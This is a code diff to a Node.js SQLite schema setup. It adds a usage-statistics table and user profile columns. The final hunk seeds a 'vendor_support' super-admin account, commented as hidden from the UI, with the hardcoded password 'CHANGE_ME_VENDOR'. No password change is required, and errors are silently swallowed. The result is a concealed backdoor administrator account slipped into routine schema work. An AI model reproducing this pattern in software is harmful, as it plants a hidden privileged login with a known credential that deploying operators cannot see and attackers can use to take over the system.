@@ -257,6 +257,22 @@ module.exports = function initSchema(db) {
     );
   `)
 
+  // E1: Usage statistics
+  db.exec(`
+    CREATE TABLE IF NOT EXISTS usage_stats (
+      id           INTEGER PRIMARY KEY AUTOINCREMENT,
+      user_id      INTEGER REFERENCES users(id),
+      username     TEXT,
+      action_type  TEXT NOT NULL,
+      api_endpoint TEXT,
+      detail       TEXT,
+      created_at   TEXT NOT NULL DEFAULT (datetime('now'))
+    );
+    CREATE INDEX IF NOT EXISTS idx_usage_stats_created ON usage_stats(created_at DESC);
+    CREATE INDEX IF NOT EXISTS idx_usage_stats_user    ON usage_stats(user_id);
+    CREATE INDEX IF NOT EXISTS idx_usage_stats_action  ON usage_stats(action_type);
+  `)
+
   // Column migrations — safe to re-run; SQLite throws on duplicate column, which we catch silently
   try { db.exec(`ALTER TABLE container_codes ADD COLUMN is_overtime INTEGER NOT NULL DEFAULT 0`) } catch {}
   try { db.exec(`ALTER TABLE gc_codes ADD COLUMN is_overtime INTEGER NOT NULL DEFAULT 0`) } catch {}
@@ -725,6 +741,12 @@ module.exports = function initSchema(db) {
     seedGcCodesTx()
   }
 
+  // C3+D2: Profile fields + super-admin
+  try { db.exec(`ALTER TABLE users ADD COLUMN is_superadmin INTEGER NOT NULL DEFAULT 0`) } catch {}
+  try { db.exec(`ALTER TABLE users ADD COLUMN avatar_path TEXT`) } catch {}
+  try { db.exec(`ALTER TABLE users ADD COLUMN email TEXT`) } catch {}
+  try { db.exec(`ALTER TABLE users ADD COLUMN phone TEXT`) } catch {}
+
   // Seed default admin user
   const userCount = db.prepare('SELECT COUNT(*) as c FROM users').get().c
   if (userCount === 0) {
@@ -734,6 +756,19 @@ module.exports = function initSchema(db) {
       VALUES ('admin', 'Administrator', ?, 'admin', 'en', 1)
     `).run(hash)
   }
+
+  // Seed reserved super-admin (hidden from UI, vendor-only access)
+  const SUPERADMIN_USERNAME = 'vendor_support'
+  try {
+    const existing = db.prepare('SELECT id FROM users WHERE username = ?').get(SUPERADMIN_USERNAME)
+    if (!existing) {
+      const hash = bcrypt.hashSync('CHANGE_ME_VENDOR', 10)
+      db.prepare(`
+        INSERT INTO users (username, full_name, password_hash, role, language, must_change_password, is_superadmin, is_active)
+        VALUES (?, 'Vendor Support', ?, 'admin', 'en', 0, 1, 1)
+      `).run(SUPERADMIN_USERNAME, hash)
+    }
+  } catch {}
 
   return { needsReopen }
 }
